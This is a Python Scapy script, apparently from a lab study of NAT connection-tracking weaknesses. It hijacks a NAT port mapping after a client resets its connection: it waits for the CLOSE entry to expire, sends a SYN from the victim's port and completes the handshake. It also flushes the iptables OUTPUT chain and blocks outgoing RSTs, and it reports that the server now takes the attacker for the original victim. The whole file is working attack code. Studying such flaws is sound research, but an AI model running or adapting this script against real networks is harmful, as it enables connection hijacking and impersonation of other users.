#!/usr/bin/env python3
"""
Combined Detect + Attack: CLOSE State — Port Grab
===================================================
Eliminates the separate "probe then attack" problem where the probe SYN
creates a SYN_RECV conntrack entry (~60s) that blocks the actual attack.

Key insight: The attack SYN *is* the probe. If it succeeds (SYN-ACK),
the port is free AND we grabbed it in one shot. No wasted probe.

Attack flow:
    1. Wait for CLOSE mapping to expire (~15s after RST)
    2. Send attack SYN directly — this both checks AND grabs
    3. If SYN-ACK → success (port grabbed in one shot)
    4. If no response → retry (port still occupied, probe SYN_RECV alive)
    5. Keep retrying until success or max attempts

Usage:
    sudo python3 attack_close_combined.py <port>

Example:
    # Client sends RST (Ctrl+\ on client), then immediately run:
    sudo python3 attack_close_combined.py 50006
"""

from scapy.all import *
import time, sys, os, signal

# ─── Config ───────────────────────────────────────────────────
SERVER_IP   = "20.0.0.20"
SERVER_PORT = 8080
NAT_EXT_IP  = "20.0.0.1"
ATTACKER_IP = "30.0.0.30"

INITIAL_WAIT    = 15   # Wait for CLOSE mapping to expire (~10s + buffer)
RETRY_INTERVAL  = 10   # Seconds between retry attempts
MAX_ATTEMPTS    = 8    # Total attempts (covers ~15 + 8*10 = 95s worst case)
SNIFF_TIMEOUT   = 3    # How long to wait for SYN-ACK per attempt
# ──────────────────────────────────────────────────────────────


def signal_handler(sig, frame):
    print("\n[!] Interrupted")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def setup():
    if os.geteuid() != 0:
        print("[!] Run as root")
        sys.exit(1)
    os.system("iptables -F OUTPUT 2>/dev/null")
    os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {SERVER_IP} -j DROP")
    print("[+] iptables: outgoing RSTs blocked\n")


def cleanup():
    os.system("iptables -F OUTPUT 2>/dev/null")


def try_grab(port, attempt):
    """
    Send one attack SYN and check for SYN-ACK.
    This is both the detection AND the attack — one packet, dual purpose.
    Returns (success, server_seq, server_ack) or (False, None, None).
    """
    print(f"  [{attempt}] SYN → {SERVER_IP}:{SERVER_PORT} (sport={port})...", end=" ", flush=True)

    syn_pkt = IP(dst=SERVER_IP) / TCP(
        sport=port, dport=SERVER_PORT, flags="S",
        seq=RandInt()
    )
    send(syn_pkt, verbose=0)

    # Listen for SYN-ACK
    pkts = sniff(
        filter=f"tcp and src host {SERVER_IP} and dst port {port}",
        timeout=SNIFF_TIMEOUT,
        count=1
    )

    if pkts and TCP in pkts[0] and pkts[0][TCP].flags & 0x12:  # SYN-ACK
        print("SYN-ACK ✓")
        return True, pkts[0][TCP].seq, pkts[0][TCP].ack
    else:
        print("no response ✗ (port still occupied)")
        return False, None, None


def complete_handshake(port, server_seq, server_ack):
    """Send ACK to complete the 3-way handshake."""
    ack_pkt = IP(dst=SERVER_IP) / TCP(
        sport=port, dport=SERVER_PORT, flags="A",
        seq=server_ack, ack=server_seq + 1
    )
    send(ack_pkt, verbose=0)


def attack(port):
    print(f"{'='*60}")
    print(f"  CLOSE State — Combined Detect + Attack")
    print(f"  Target port : {port}")
    print(f"  Server      : {SERVER_IP}:{SERVER_PORT}")
    print(f"  Strategy    : Attack SYN = Probe (no separate check)")
    print(f"{'='*60}\n")

    # ── Phase 1: Initial wait for CLOSE mapping expiry ──
    print(f"[*] Phase 1: Waiting {INITIAL_WAIT}s for CLOSE mapping to expire...")
    time.sleep(INITIAL_WAIT)
    print(f"[+] Initial wait done\n")

    # ── Phase 2: Attempt to grab (retry loop) ──
    print(f"[*] Phase 2: Attempting port grab (max {MAX_ATTEMPTS} attempts, "
          f"{RETRY_INTERVAL}s between retries)...\n")

    for attempt in range(1, MAX_ATTEMPTS + 1):
        success, server_seq, server_ack = try_grab(port, attempt)

        if success:
            # ── Phase 3: Complete handshake ──
            print(f"\n[*] Phase 3: Completing handshake...")
            complete_handshake(port, server_seq, server_ack)

            print(f"\n[+] ════════════════════════════════════════════")
            print(f"[+]  ATTACK SUCCESS on attempt {attempt}!")
            print(f"[+]  Port {port} grabbed — attacker owns this mapping")
            print(f"[+]  NAT: {ATTACKER_IP}:{port} → {NAT_EXT_IP}:{port}")
            print(f"[+]  Server thinks attacker is the original victim")
            print(f"[+] ════════════════════════════════════════════\n")
            return True

        if attempt < MAX_ATTEMPTS:
            print(f"      Retrying in {RETRY_INTERVAL}s...\n")
            time.sleep(RETRY_INTERVAL)

    print(f"\n[-] All {MAX_ATTEMPTS} attempts failed.")
    print(f"[-] The port may still be in use or NAT behavior differs.")
    return False


def main():
    if len(sys.argv) < 2:
        print("Usage: sudo python3 attack_close_combined.py <port>")
        sys.exit(1)

    port = int(sys.argv[1])
    setup()
    try:
        success = attack(port)
    finally:
        cleanup()
        print("[*] iptables cleaned up")

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()